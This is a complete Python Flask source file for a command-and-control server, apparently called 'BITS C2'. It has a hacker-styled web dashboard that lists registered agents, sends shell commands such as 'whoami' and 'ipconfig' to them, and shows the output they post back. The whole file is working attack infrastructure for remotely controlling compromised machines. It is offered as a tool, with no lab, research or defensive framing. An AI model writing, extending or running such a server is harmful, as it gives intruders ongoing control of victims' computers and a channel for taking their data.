#!/usr/bin/env python3
"""
BITS C2 - Web Interface Version
Clean web dashboard instead of terminal mixing
"""
from flask import Flask, request, jsonify, render_template_string
import threading
import time
from datetime import datetime

app = Flask(__name__)

# Command queue and results
commands = {}
results = {}
agents = {}

# HTML Dashboard
DASHBOARD = '''
<!DOCTYPE html>
<html>
<head>
    <title>BITS C2 Dashboard</title>
    <style>
        body {
            background: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #00ff00;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
        }
        .section {
            background: #2a2a2a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .agent {
            background: #3a3a3a;
            padding: 10px;
            margin: 10px 0;
            border-left: 3px solid #00ff00;
        }
        input, textarea {
            background: #1a1a1a;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            width: 100%;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        button {
            background: #00ff00;
            color: #1a1a1a;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background: #00cc00;
        }
        .output {
            background: #0a0a0a;
            color: #00ff00;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #00ff00;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .status {
            color: #ffff00;
            font-weight: bold;
        }
        .timestamp {
            color: #888;
            font-size: 0.9em;
        }
    </style>
    <script>
        let autoRefresh = true;
        
        function sendCommand(agentId) {
            const cmd = document.getElementById('cmd_' + agentId).value;
            fetch('/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({agent_id: agentId, command: cmd})
            }).then(() => {
                document.getElementById('cmd_' + agentId).value = '';
                if(autoRefresh) setTimeout(() => location.reload(), 2000);
            });
        }
        
        function toggleRefresh() {
            autoRefresh = !autoRefresh;
            document.getElementById('refreshBtn').textContent = autoRefresh ? '⏸️ Pause Refresh' : '▶️ Resume Refresh';
        }
        
        // Auto refresh every 5 seconds
        setInterval(() => { if(autoRefresh) location.reload(); }, 5000);
    </script>
</head>
<body>
    <div class="container">
        <h1>🔴 BITS C2 Dashboard</h1>
        <button id="refreshBtn" onclick="toggleRefresh()" style="margin-bottom:10px;padding:5px 10px;background:#222;color:#0f0;border:1px solid #0f0;cursor:pointer;">⏸️ Pause Refresh</button>
        
        <div class="section">
            <h2>Active Agents: {{ agents|length }}</h2>
            {% if agents %}
                {% for agent_id, data in agents.items() %}
                <div class="agent">
                    <h3>{{ agent_id }}</h3>
                    <p class="timestamp">Last seen: {{ data.last_seen }}</p>
                    <p class="status">Status: {{ data.status }}</p>
                    
                    <h4>Send Command:</h4>
                    <input type="text" id="cmd_{{ agent_id }}" placeholder="Enter command (e.g., whoami, ipconfig)">
                    <button onclick="sendCommand('{{ agent_id }}')">Execute</button>
                    
                    {% if agent_id in results %}
                    <h4>Last Result:</h4>
                    <div class="output">{{ results[agent_id] }}</div>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <p>No active agents. Waiting for connections...</p>
            {% endif %}
        </div>
        
        <div class="section">
            <h2>Server Info</h2>
            <p>Server Time: {{ server_time }}</p>
            <p>Listening on: http://0.0.0.0:8080</p>
            <p>Total Commands Sent: {{ total_commands }}</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def dashboard():
    """Web dashboard"""
    return render_template_string(
        DASHBOARD,
        agents=agents,
        results=results,
        server_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        total_commands=len(results)
    )

@app.route('/send_command', methods=['POST'])
def send_command():
    """Send command to agent via web UI"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')
    commands[agent_id] = command
    print(f"[+] Queued command for {agent_id}: {command}")
    return jsonify({"status": "ok"})

@app.route('/register', methods=['GET', 'POST'])
def register():
    """Agent registration"""
    if request.method == 'POST':
        data = request.get_json()
        agent_id = data.get('agent_id', 'unknown')
    else:
        agent_id = request.args.get('id', 'unknown')
    
    agents[agent_id] = {
        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'active'
    }
    print(f"[+] Agent registered: {agent_id}")
    return jsonify({"status": "ok", "message": "registered"})

@app.route('/cmd/<agent_id>', methods=['GET'])
def get_command(agent_id):
    """Get pending command for agent"""
    # Update last seen
    if agent_id in agents:
        agents[agent_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if agent_id in commands:
        cmd = commands.pop(agent_id)
        print(f"[>] Sending to {agent_id}: {cmd}")
        return jsonify({"command": cmd})
    return jsonify({"command": ""})

@app.route('/result/<agent_id>', methods=['POST'])
def post_result(agent_id):
    """Receive command result from agent"""
    data = request.get_json()
    result = data.get('result', '')
    results[agent_id] = result
    print(f"[<] Result from {agent_id} ({len(result)} bytes)")
    return jsonify({"status": "ok"})

@app.route('/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({"status": "healthy", "agents": len(agents)})

if __name__ == '__main__':
    print("="*60)
    print("BITS C2 SERVER - WEB INTERFACE")
    print("="*60)
    print()
    print("[*] Starting server on http://0.0.0.0:8080")
    print("[*] Open browser: http://localhost:8080")
    print()
    print("="*60)
    
    # Disable Flask request logging for cleaner output
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.WARNING)
    
    app.run(host='0.0.0.0', port=8080, debug=False)
